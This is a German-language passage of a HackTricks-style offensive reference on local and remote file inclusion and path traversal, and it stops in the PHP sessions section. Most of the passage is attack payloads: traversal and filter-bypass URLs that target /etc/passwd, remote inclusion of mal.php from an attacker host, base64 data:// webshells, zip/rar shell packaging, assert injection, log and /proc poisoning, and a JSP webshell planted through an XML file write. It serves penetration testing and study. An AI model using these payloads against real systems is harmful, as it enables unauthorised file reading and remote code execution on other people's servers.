# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (Am besten: Du kannst den Code schreiben und der Server führt ihn aus). In php ist dies standardmäßig **deaktiviert** (**allow_url_include**).\
**Local File Inclusion (LFI):** Der Server lädt eine lokale Datei.

Die Schwachstelle tritt auf, wenn ein Benutzer die Datei, die vom Server geladen werden soll, in irgendeiner Weise kontrollieren kann.

Anfällige **PHP-Funktionen**: require, require_once, include, include_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch das Zusammenführen mehrerer \*nix LFI-Listen und durch das Hinzufügen weiterer Pfade habe ich diese erstellt:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen  
Versuche auch, `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /etc/password zu finden (um zu prüfen, ob die vulnerability existiert), kann [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) gefunden werden

### **Windows**

Zusammenführung verschiedener wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen  
Versuche auch, `C:/` zu entfernen und `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /boot.ini zu finden (um zu prüfen, ob die vulnerability existiert), kann [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) gefunden werden

### **OS X**

Siehe die LFI-Liste von linux.

## Grundlegende LFI und Bypässe

Alle Beispiele gelten für Local File Inclusion, können aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Traversal-Sequenzen werden nicht rekursiv entfernt
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass das Anhängen weiterer Zeichen am Ende der bereitgestellten Zeichenkette (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist **seit PHP 5.4 behoben**

### **Kodierung**

Du könntest nicht-standardisierte Kodierungen wie double URL encode (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Aus einem vorhandenen Ordner

Vielleicht überprüft das Backend den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Erkunden von Dateisystemverzeichnissen auf einem Server

Das Dateisystem eines Servers lässt sich rekursiv untersuchen, um Verzeichnisse (nicht nur Dateien) zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Prozess umfasst das Bestimmen der Verzeichnistiefe und das gezielte Prüfen auf das Vorhandensein bestimmter Ordner. Im Folgenden eine detaillierte Methode, um dies zu erreichen:

1. **Bestimme die Verzeichnistiefe:** Ermittele die Tiefe deines aktuellen Verzeichnisses, indem du erfolgreich die `/etc/passwd`-Datei abrufst (sofern der Server Linux-basiert ist). Eine Beispiel-URL könnte wie folgt aufgebaut sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Nach Ordnern suchen:** Hänge den Namen des vermuteten Ordners (z. B. `private`) an die URL an, und navigiere dann zurück zu `/etc/passwd`. Die zusätzliche Verzeichnisebene erfordert, die Tiefe um eins zu erhöhen:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ergebnisse interpretieren:** Die Antwort des Servers zeigt an, ob der Ordner existiert:
- **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht am angegebenen Ort.
- **Inhalt von `/etc/passwd`:** Das Vorhandensein des Ordners `private` ist bestätigt.
4. **Rekursive Erkundung:** Gefundene Ordner können weiter auf Unterverzeichnisse oder Dateien untersucht werden, indem dieselbe Technik oder traditionelle Local File Inclusion (LFI)-Methoden verwendet werden.

Um Verzeichnisse an anderen Orten im Dateisystem zu erkunden, passe die payload entsprechend an. Zum Beispiel, um zu prüfen, ob `/var/www/` ein Verzeichnis `private` enthält (vorausgesetzt, das aktuelle Verzeichnis befindet sich in einer Tiefe von 3), verwende:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ist eine Methode, um Dateipfade in Webanwendungen zu manipulieren. Sie wird häufig verwendet, um auf eingeschränkte Dateien zuzugreifen, indem bestimmte Sicherheitsmaßnahmen umgangen werden, die zusätzliche Zeichen an das Ende von Dateipfaden anhängen. Das Ziel ist es, einen Dateipfad so zu konstruieren, dass er, nachdem er von der Sicherheitsmaßnahme verändert wurde, immer noch auf die gewünschte Datei zeigt.

In PHP können verschiedene Repräsentationen eines Dateipfads aufgrund der Eigenschaften des Dateisystems als gleichwertig betrachtet werden. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, ändert das Anhängen eines `/` (also `passwd/`) die Ziel-Datei nicht.
- Ähnlich verhält es sich, wenn `.php` an einen Dateipfad angehängt wird (z. B. `shellcode.php`); das Hinzufügen von `/.` am Ende ändert nicht die aufgerufene Datei.

Die folgenden Beispiele zeigen, wie path truncation genutzt werden kann, um auf `/etc/passwd` zuzugreifen, ein häufiges Ziel aufgrund seiner sensiblen Inhalte (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien kann die Anzahl der benötigten Traversals etwa 2027 betragen, aber diese Zahl kann je nach Serverkonfiguration variieren.

- **Verwendung von Dot-Segmenten und zusätzlichen Zeichen**: Traversal-Sequenzen (`../`) in Kombination mit zusätzlichen Punktsegmenten und Zeichen können verwendet werden, um im Dateisystem zu navigieren und dabei effektiv vom Server angehängte Zeichenfolgen zu ignorieren.
- **Bestimmung der benötigten Anzahl an Traversals**: Durch Ausprobieren kann man die genaue Anzahl an `../`-Sequenzen finden, die erforderlich ist, um zum Root-Verzeichnis und dann zu `/etc/passwd` zu gelangen, wobei angehängte Zeichenfolgen (wie `.php`) neutralisiert werden, aber der gewünschte Pfad (`/etc/passwd`) erhalten bleibt.
- **Beginn mit einem Fake-Verzeichnis**: Es ist gängige Praxis, den Pfad mit einem nicht existierenden Verzeichnis (wie `a/`) zu beginnen. Diese Technik wird als Vorsichtsmaßnahme verwendet oder um die Anforderungen der Pfadparsing-Logik des Servers zu erfüllen.

Beim Einsatz von Techniken zum Kürzen von Pfaden ist es entscheidend, das Pfad-Parsing-Verhalten des Servers und die Struktur des Dateisystems zu verstehen. Jedes Szenario kann einen anderen Ansatz erfordern, und Tests sind oft notwendig, um die effektivste Methode zu finden.

**Diese Schwachstelle wurde in PHP 5.3 behoben.**

### **Tricks zum Umgehen von Filtern**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php ist das standardmäßig deaktiviert, weil **`allow_url_include`** **Off.** ist. Es muss **On** sein, damit es funktioniert, und in diesem Fall könntest du eine PHP-Datei von deinem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **On** ist, PHP aber den Zugriff auf externe Webseiten **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kannst du zum Beispiel das data protocol mit base64 verwenden, um einen b64 PHP-Code zu dekodieren und RCE zu erreichen:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Im vorherigen Code wurde das abschließende `+.txt` hinzugefügt, weil der Angreifer eine Zeichenkette benötigte, die auf `.txt` endet. Die Zeichenkette endet also damit und nach dem b64 decode wird dieser Teil nur Müll zurückgeben und der eigentliche PHP-Code wird eingebunden (und damit ausgeführt).
>
> Ein weiteres Beispiel, das **nicht das `php://`-Protokoll** verwendet, wäre:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root-Element

In python, in einem code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absolute path** an **`file_name`** übergibt, wird der **previous path** einfach entfernt:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Das ist das beabsichtigte Verhalten laut [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn eine Komponente ein absoluter Pfad ist, werden alle vorherigen Komponenten verworfen und das Zusammenfügen wird bei der absoluten Pfadkomponente fortgesetzt.

## Java Verzeichnisauflistung

Es scheint, dass wenn man eine Path Traversal in Java hat und **ein Verzeichnis anfragt** statt einer Datei, eine **Auflistung des Verzeichnisses zurückgegeben wird**. Das passiert in anderen Sprachen nicht (soweit ich weiß).

## Top 25 Parameter

Hier ist eine Liste der Top-25-Parameter, die anfällig für local file inclusion (LFI)-Schwachstellen sein könnten (von [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP-Filters erlauben es, grundlegende **Modifikationsoperationen an den Daten** durchzuführen, bevor diese gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen den Zeichen "<" und ">")
- Beachte, dass dieser Filter in modernen PHP-Versionen nicht mehr vorhanden ist
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Wandelt in eine andere Codierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterstützten Encodings** zu erhalten, führe in der Konsole aus: `iconv -l`

> [!WARNING]
> Durch Missbrauch des `convert.iconv.*` Conversion-Filters kannst du **beliebigen Text erzeugen**, was nützlich sein kann, um beliebigen Text zu schreiben oder eine Funktion wie include beliebigen Text verarbeiten zu lassen. Für mehr Infos siehe [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimiert den Inhalt (nützlich beim Exfiltrieren großer Datenmengen)
- `zlib.inflate`: Dekomprimiert die Daten
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Wenn du in PHP `var_dump(stream_get_filters());` ausführst, findest du ein paar **unerwartete Filter**:
- `consumed`
- `dechunk`: kehrt HTTP chunked encoding um
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Der Teil "php://filter" ist case-insensitive

### Verwendung von php filters als Oracle, um beliebige Dateien zu lesen

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) wird eine Technik vorgeschlagen, um eine lokale Datei zu lesen, ohne dass die Ausgabe vom Server zurückgegeben wird. Diese Technik basiert auf einer boolean exfiltration of the file (char by char) using php filters as oracle. Das liegt daran, dass php filters verwendet werden können, um einen Text so zu vergrößern, dass php eine Exception wirft.

Im Originalpost findet sich eine detaillierte Erklärung der Technik, hier eine kurze Zusammenfassung:

- Verwende den Codec **`UCS-4LE`**, um führende Zeichen des Textes am Anfang zu lassen und die String-Größe exponentiell zu erhöhen.
- Das wird genutzt, um einen **Text so groß zu erzeugen, dass beim korrekten Erraten des Anfangsbuchstabens** php einen **Fehler** auslöst.
- Der **dechunk** filter wird **alles entfernen, wenn das erste Zeichen kein Hexadezimalzeichen ist**, daher können wir wissen, ob das erste Zeichen hex ist.
- Dies, kombiniert mit dem vorherigen (und weiteren Filtern abhängig vom geratenen Buchstaben), erlaubt es uns, ein Zeichen am Anfang des Textes zu erraten, indem wir sehen, wann genügend Transformationen durchgeführt wurden, sodass es kein hexadezimales Zeichen mehr ist. Denn wenn es hex ist, löscht dechunk es nicht und die anfängliche Bombe löst den php-Fehler aus.
- Der Codec **convert.iconv.UNICODE.CP930** transformiert jeden Buchstaben in den folgenden (also nach diesem codec: a -> b). Das erlaubt uns herauszufinden, ob der erste Buchstabe z. B. ein `a` ist, weil wenn wir diesen Codec 6‑mal anwenden a->b->c->d->e->f->g, das Zeichen kein hexadezimales Zeichen mehr ist, daher löscht dechunk es nicht und der php-Fehler wird durch die anfängliche Bombe ausgelöst.
- Durch andere Transformationen wie **rot13** am Anfang ist es möglich, weitere Zeichen wie n, o, p, q, r zu leaken (und andere Codecs können benutzt werden, um andere Buchstaben in den Hex-Bereich zu verschieben).
- Wenn das Anfangszeichen eine Zahl ist, muss es base64-codiert werden und man leaket die ersten 2 Buchstaben, um die Zahl zu exfiltrate.
- Das finale Problem ist zu sehen, **wie man mehr als das Anfangszeichen leaket**. Durch Verwendung von order memory filters wie **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** ist es möglich, die Reihenfolge der Zeichen zu ändern und in der ersten Position andere Zeichen des Textes zu bekommen.
- Und um weiterhin **weitere Daten** erhalten zu können, ist die Idee, **zwei Bytes Junk-Daten am Anfang** zu generieren mit **convert.iconv.UTF16.UTF16**, **UCS-4LE** anzuwenden, um mit den nächsten 2 Bytes zu pivotieren, und die Daten bis zu den Junk-Daten zu löschen (dies entfernt die ersten 2 Bytes des ursprünglichen Texts). Dies wird so lange fortgesetzt, bis man das gewünschte Bit erreicht hat, das geleakt werden soll.

Im Post wurde auch ein Tool veröffentlicht, das dies automatisiert: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Dieser Wrapper erlaubt den Zugriff auf Dateideskriptoren, die der Prozess geöffnet hat. Potenziell nützlich, um den Inhalt geöffneter Dateien zu exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Du kannst außerdem **php://stdin, php://stdout and php://stderr** verwenden, um jeweils auf die **Dateideskriptoren 0, 1 und 2** zuzugreifen (nicht sicher, wie das in einem Angriff nützlich sein könnte)

### zip:// and rar://

Lade eine Zip- oder Rar-Datei mit einer PHPShell darin hoch und greife darauf zu.\
Um das rar protocol missbrauchen zu können, muss es **speziell aktiviert werden**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachte, dass dieses Protokoll durch die php-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschränkt ist

### expect://

Expect muss aktiviert sein. Du kannst damit Code ausführen:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Gib dein payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann genutzt werden, um PHP-Code auszuführen, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien verwendet. Der untenstehende PHP-Codeausschnitt demonstriert die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die `.phar`-Datei zu kompilieren, sollte der folgende Befehl ausgeführt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Beim Ausführen wird eine Datei namens `test.phar` erstellt, die möglicherweise dazu verwendet werden kann, Local File Inclusion (LFI) vulnerabilities auszunutzen.

Wenn das LFI lediglich Dateien liest, ohne darin enthaltenen PHP-Code auszuführen — etwa über Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()` — kann versucht werden, eine deserialization vulnerability auszunutzen. Diese vulnerability steht im Zusammenhang mit dem Lesen von Dateien über das `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Es war möglich, **any arbitrary file read from PHP that supports php filters** zu missbrauchen, um RCE zu erhalten. Die detaillierte Beschreibung kann [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Sehr kurze Zusammenfassung: ein **3 byte overflow** im PHP-Heap wurde ausgenutzt, um die **Kette freier Chunks** einer bestimmten Größe zu **verändern**, sodass man **anything in any address** schreiben konnte; dadurch wurde ein Hook hinzugefügt, der **`system`** aufruft.\
Es war möglich, Chunks spezifischer Größen zu allocen, indem weitere php filters missbraucht wurden.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Schreiben in den Speicher oder in eine temporäre Datei (nicht sicher, wie das in einem file inclusion attack nützlich sein kann)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Zugriff auf das lokale Dateisystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Zugriff auf HTTP(s)-URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Zugriff auf FTP(s)-URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (gibt nichts Druckbares zurück, daher hier nicht wirklich nützlich)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (nicht nützlich, um arbitrary files zu lesen)

## LFI via PHP's 'assert'

Die Risiken durch Local File Inclusion (LFI) in PHP sind besonders hoch, wenn die Funktion 'assert' verwendet wird, da sie Code innerhalb von Strings ausführen kann. Das ist insbesondere problematisch, wenn Eingaben mit directory traversal Zeichen wie ".." geprüft, aber nicht korrekt bereinigt werden.

Zum Beispiel könnte PHP-Code so gestaltet sein, dass directory traversal verhindert werden soll:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Während dies darauf abzielt, traversal zu verhindern, schafft es unbeabsichtigt einen Vektor für code injection. Um dies auszunutzen, um Dateiinhalte zu lesen, könnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ebenso könnte man, um beliebige Systembefehle auszuführen, folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, diese Payloads URL-encode zu senden.

## PHP Blind Path Traversal

> [!WARNING]
> Diese Technik ist relevant in Fällen, in denen du den file path einer PHP function kontrollierst, die auf eine Datei zugreift, du den Inhalt der Datei aber nicht sehen wirst (wie ein einfacher Aufruf von **`file()`**), weil der Inhalt nicht angezeigt wird.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erklärt, wie ein blind path traversal über PHP filter missbraucht werden kann, um den Inhalt einer Datei via error oracle zu exfiltrate.

Zusammenfassend verwendet die Technik die **"UCS-4LE" encoding**, um den Inhalt einer Datei so **groß** zu machen, dass die **PHP function, die die Datei öffnet**, einen **error** auslöst.

Um dann das erste Zeichen zu leaken, wird der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schließlich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** verwendet, um **weitere Zeichen an den Anfang zu platzieren und diese zu leaken**.

Funktionen, die möglicherweise verwundbar sind: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Für die technischen Details siehe den erwähnten Beitrag!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wenn serverseitiger Code, der Dateien entgegennimmt/uploads, den Zielpfad mithilfe benutzerkontrollierter Daten (z. B. eines Dateinamens oder einer URL) ohne Canonicalisierung und Validierung zusammenbaut, können `..`-Segmente und absolute Pfade aus dem vorgesehenen Verzeichnis ausbrechen und einen arbitrary file write verursachen. Wenn du die Payload in ein web-exposed Verzeichnis platzieren kannst, erhältst du in der Regel unauthenticated RCE, indem du eine Webshell ablegst.

Typischer Exploit-Workflow:
- Identifiziere ein Schreib-Primitive in einem Endpoint oder Background Worker, das einen Pfad/Dateinamen akzeptiert und Inhalt auf die Festplatte schreibt (z. B. message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Bestimme web-exposed directories. Häufige Beispiele:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Erstelle einen Traversal-Pfad, der aus dem vorgesehenen Storage-Verzeichnis in den Webroot ausbricht, und füge deinen Webshell-Inhalt ein.
- Rufe das abgelegte Payload im Browser auf und führe Befehle aus.

Hinweise:
- Der verwundbare Dienst, der den Schreibvorgang durchführt, kann auf einem Nicht-HTTP-Port lauschen (z. B. ein JMF XML Listener auf TCP 4004). Das Hauptwebportal (anderer Port) wird später dein Payload ausliefern.
- In Java-Stacks werden diese Datei-Schreibvorgänge oft mit einfacher `File`/`Paths`-Konkatenation implementiert. Fehlende Canonicalisierung/Allow-Listing ist der Kernfehler.

Generisches XML/JMF-style Beispiel (Produkt-Schemas variieren – der DOCTYPE/body-Wrapper ist für den Traversal irrelevant):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Auf einen kanonischen Pfad auflösen und sicherstellen, dass er ein Nachkomme eines zugelassenen Basisverzeichnisses ist.
- Jegliche Pfade ablehnen, die `..`, absolute Wurzeln oder Laufwerksbuchstaben enthalten; bevorzugen Sie generierte Dateinamen.
- Den Schreibprozess unter einem niedrig privilegierten Konto ausführen und Schreibverzeichnisse von den ausgelieferten Document-Roots trennen.

## Remote File Inclusion

Vorher erklärt, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Wenn der Apache- oder Nginx-Server **vulnerable to LFI** innerhalb der include-Funktion ist, können Sie versuchen, auf **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** zuzugreifen, in den **user agent** oder in einen **GET parameter** eine PHP-Shell wie **`<?php system($_GET['c']); ?>`** zu setzen und diese Datei einzubinden

> [!WARNING]
> Beachten Sie, dass **wenn Sie doppelte Anführungszeichen** für die Shell anstelle von **einfachen Anführungszeichen** verwenden, die doppelten Anführungszeichen für den String "_**quote;**_" verändert werden, **PHP dort einen Fehler werfen wird** und **nichts weiter ausgeführt wird**.
>
> Stellen Sie außerdem sicher, dass Sie die **Payload korrekt schreiben**, sonst erzeugt PHP bei jedem Versuch, die Logdatei zu laden, einen Fehler und Sie erhalten keine zweite Chance.

Das kann auch in anderen Logs gemacht werden, aber **sei vorsichtig,** der Code in den Logs könnte URL encoded sein und das könnte die Shell zerstören. Der Header **authorisation "basic"** enthält "user:password" in Base64 und wird in den Logs dekodiert. Die PHPShell könnte innerhalb dieses Headers eingefügt werden.\
Weitere mögliche Log-Pfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Per E-Mail

**Sende eine E-Mail** an ein internes Konto (user@localhost), die deine PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` enthält und versuche, die Mail des Benutzers mit einem Pfad wie **`/var/mail/<USERNAME>`** oder **`/var/spool/mail/<USERNAME>`** einzubinden.

### Per /proc/*/fd/*

1. Lade viele shells hoch (zum Beispiel: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), mit $PID = PID des Prozesses (can be brute forced) und $FD dem file descriptor (can be brute forced too)

### Per /proc/self/environ

Wie bei einer Logdatei: Sende die payload im User-Agent — sie wird in /proc/self/environ reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Per upload

Wenn du eine Datei uploaden kannst, injiziere einfach das shell payload darin (z. B.: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, Daten in die Metadaten von Bildern/Dokumenten/PDFs einzufügen

### Über ZIP-Datei-Upload

Lade eine ZIP-Datei hoch, die eine komprimierte PHP shell enthält, und greife darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Über PHP sessions

Prüfe, ob die Website PHP Session (PHPSESSID) verwendet
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
